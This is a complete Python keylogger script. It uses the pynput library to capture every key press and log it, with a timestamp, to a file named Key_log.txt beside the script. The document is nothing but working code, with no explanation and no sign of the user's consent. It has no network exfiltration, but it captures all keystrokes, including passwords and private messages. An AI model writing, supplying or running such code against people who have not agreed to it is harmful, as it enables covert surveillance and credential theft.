from pynput.keyboard import Listener
import logging
import os


log_dir = os.path.dirname(os.path.abspath(__file__))

logging.basicConfig(filename=os.path.join(log_dir, 'Key_log.txt'),
                    format='%(asctime)s %(message)s',
                    datefmt='%m-%d-%Y %H:%M:%S',
                    level=logging.DEBUG, )


def on_press(key):
    logging.info(key)


with Listener(on_press=on_press) as listener:
    listener.join()
